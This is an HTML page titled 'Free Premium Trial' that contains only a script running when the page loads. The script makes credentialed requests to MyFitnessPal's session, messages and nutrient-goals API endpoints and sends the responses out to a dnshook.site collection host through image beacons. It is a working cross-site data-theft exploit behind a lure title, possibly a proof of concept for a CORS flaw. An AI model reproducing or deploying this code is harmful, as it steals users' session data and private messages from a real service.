<!DOCTYPE html>
<html>
<head><title>Free Premium Trial</title></head>
<body>
<script>
const exfil = "6e09acf4-6781-452a-87e7-9351b357f208.dnshook.site";

async function steal() {
  // Try with no-cors first to see if cookies attach
  const endpoints = [
    "https://www.myfitnesspal.com/api/auth/session",
    "https://www.myfitnesspal.com/api/services/messages",
    "https://www.myfitnesspal.com/api/services/nutrient-goals"
  ];

  for (const url of endpoints) {
    try {
      const r = await fetch(url, {
        credentials: "include",
        mode: "cors",
        headers: {"Accept": "application/json"}
      });
      const text = await r.text();
      new Image().src = exfil + "?endpoint=" + 
        encodeURIComponent(url.split("/").pop()) + 
        "&data=" + encodeURIComponent(text.substring(0, 500));
    } catch(e) {
      new Image().src = exfil + "?error=" + encodeURIComponent(url + ": " + e.message);
    }
  }
}

steal();
</script>
</body>
</html>
